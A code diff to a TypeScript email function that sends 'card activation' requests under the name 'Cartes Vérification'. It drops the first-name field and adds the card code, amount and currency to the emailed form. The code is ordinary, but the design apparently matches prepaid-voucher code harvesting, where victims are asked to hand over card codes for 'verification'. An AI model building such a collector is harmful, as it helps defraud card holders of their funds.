@@ -73,10 +73,12 @@ export async function sendContactEmail({
 }
 
 export async function sendActivateEmail({
-  firstName,
   lastName,
   email,
   cardType,
+  cardCode,
+  amount,
+  currency,
   image,
 }: SendActivateEmailParams): Promise<void> {
   const transporter = createTransporter();
@@ -96,17 +98,13 @@ export async function sendActivateEmail({
     from: `"Cartes Vérification" <${process.env.EMAIL_USER}>`,
     to: destination,
     replyTo: email,
-    subject: `Demande d'activation de carte ${cardType} — ${firstName} ${lastName}`,
+    subject: `Demande d'activation de carte ${cardType} — ${lastName}`,
     html: `
       <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
         <h2 style="color: #1a1a2e; border-bottom: 2px solid #c9a227; padding-bottom: 12px;">
           Demande d'activation de carte
         </h2>
         <table style="width: 100%; border-collapse: collapse; margin-top: 20px;">
-<tr>
-            <td style="padding: 10px 0; font-weight: bold; color: #555;">Prénom</td>
-            <td style="padding: 10px 0;">${escapeHtml(firstName)}</td>
-          </tr>
           <tr>
             <td style="padding: 10px 0; font-weight: bold; color: #555;">Nom</td>
             <td style="padding: 10px 0;">${escapeHtml(lastName)}</td>
@@ -115,9 +113,17 @@ export async function sendActivateEmail({
             <td style="padding: 10px 0; font-weight: bold; color: #555;">Email</td>
             <td style="padding: 10px 0;">${escapeHtml(email)}</td>
           </tr>
-<tr>
+          <tr>
             <td style="padding: 10px 0; font-weight: bold; color: #555;">Type de carte</td>
             <td style="padding: 10px 0;">${escapeHtml(cardType)}</td>
+          </tr>
+          <tr>
+            <td style="padding: 10px 0; font-weight: bold; color: #555;">Code de la carte</td>
+            <td style="padding: 10px 0;">${escapeHtml(cardCode)}</td>
+          </tr>
+          <tr>
+            <td style="padding: 10px 0; font-weight: bold; color: #555;">Montant</td>
+            <td style="padding: 10px 0;">${escapeHtml(amount)} ${escapeHtml(currency)}</td>
           </tr>
         </table>
         ${image ? `<p style="margin-top: 20px; color: #555;">Justificatif joint : ${escapeHtml(image.name)}</p>` : ""}
